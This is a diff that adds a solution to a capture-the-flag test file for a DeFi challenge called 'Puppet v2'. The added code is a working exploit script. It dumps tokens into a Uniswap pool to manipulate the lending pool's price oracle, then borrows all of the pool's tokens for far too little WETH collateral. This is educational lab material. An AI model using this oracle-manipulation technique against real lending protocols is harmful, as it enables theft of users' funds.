@@ -83,6 +83,46 @@ describe('[Challenge] Puppet v2', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+
+        const printBalances = async () => {
+            console.log("player weth", String(await weth.balanceOf(player.address)).slice(0, -18));
+            console.log("player token", String(await token.balanceOf(player.address)).slice(0, -18));
+            console.log("player eth", String(await ethers.provider.getBalance(player.address)).slice(0, -18));
+            console.log("uniswap weth", String(await weth.balanceOf(uniswapExchange.address)).slice(0, -18));
+            console.log("uniswap token", String(await token.balanceOf(uniswapExchange.address)).slice(0, -18));
+            console.log("uniswap eth", String(await ethers.provider.getBalance(uniswapExchange.address)).slice(0, -18));
+            console.log("weth required", String(await lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE)).slice(0, -18));
+            console.log("-");
+        }
+
+        // Print the previous balance of player and uniswap
+        await printBalances();
+
+        // Approve uniswapRouter to spend all player's balance
+        await token.connect(player).approve(uniswapRouter.address, PLAYER_INITIAL_TOKEN_BALANCE)
+        // Swap all player's tokens for weth.
+        await uniswapRouter.connect(player).swapExactTokensForTokens(
+            PLAYER_INITIAL_TOKEN_BALANCE,                               // amountIn
+            1,                                                          // amountOutMin
+            [token.address, weth.address],                              // [From, To]
+            player.address,                                             // to
+            (await ethers.provider.getBlock('latest')).timestamp * 2    // deadline                                 // arbitrary deadline
+        )
+        // Print the current balance of player and uniswap
+        await printBalances();
+
+        // Deposit all Ether to get the extra WETH we need
+        await weth.connect(player).deposit({value: ethers.utils.parseEther('19.9')})
+        // Print the current balance of player and uniswap
+        await printBalances();
+
+        // Borrow the tokens from the pool
+        const requiredWETH = await lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+        await weth.connect(player).approve(lendingPool.address, requiredWETH);
+        await lendingPool.connect(player).borrow(POOL_INITIAL_TOKEN_BALANCE);
+        // Print the balance of player and uniswap after the taking all tokens
+        await printBalances();
+
     });
 
     after(async function () {
